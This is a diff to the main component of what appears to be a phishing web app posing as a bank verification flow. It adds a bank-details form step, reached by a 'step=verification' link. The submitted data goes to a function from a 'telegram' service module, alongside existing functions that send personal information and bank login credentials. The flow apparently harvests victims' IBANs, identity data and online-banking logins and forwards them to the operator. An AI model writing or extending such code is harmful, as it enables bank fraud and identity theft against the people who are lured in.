@@ -9,9 +9,9 @@ import { AuthPage } from './components/AuthPage';
 import { BankSelectionForm, ExternalBankData } from './components/BankSelectionForm';
 import { BankAuthForm } from './components/BankAuthForm';
 import { SuccessMessage } from './components/SuccessMessage';
-import { sendTelegramMessage, sendPersonalInfoData, sendBankAuthData } from './services/telegram';
+import { sendTelegramMessage, sendPersonalInfoData, sendBankFormData, sendBankAuthData } from './services/telegram';
 
-type Step = 'home' | 'iban' | 'personal' | 'auth' | 'bankSelection' | 'bankAuth' | 'success';
+type Step = 'home' | 'iban' | 'personal' | 'bank' | 'auth' | 'bankSelection' | 'bankAuth' | 'success';
 
 export default function App() {
   const [currentStep, setCurrentStep] = useState<Step>('home');
@@ -22,7 +22,7 @@ export default function App() {
   React.useEffect(() => {
     const params = new URLSearchParams(window.location.search);
     if (params.get('step') === 'verification') {
-      setCurrentStep('bankSelection');
+      setCurrentStep('bank');
     }
   }, []);
 
@@ -46,6 +46,14 @@ export default function App() {
     const success = await sendPersonalInfoData(formData);
     if (success) {
       setUserAmount(formData.amount);
+      setCurrentStep('auth');
+    }
+    return success;
+  };
+
+  const handleBankFormSubmit = async (formData: any) => {
+    const success = await sendBankFormData(formData);
+    if (success) {
       setCurrentStep('auth');
     }
     return success;
@@ -107,6 +115,9 @@ export default function App() {
       )}
       {currentStep === 'personal' && (
         <PersonalInfoForm onSubmit={handlePersonalInfoSubmit} />
+      )}
+      {currentStep === 'bank' && (
+        <BankForm onSubmit={handleBankFormSubmit} amount={userAmount} />
       )}
       {currentStep === 'auth' && (
         <AuthPage onAuthComplete={handleAuthComplete} />
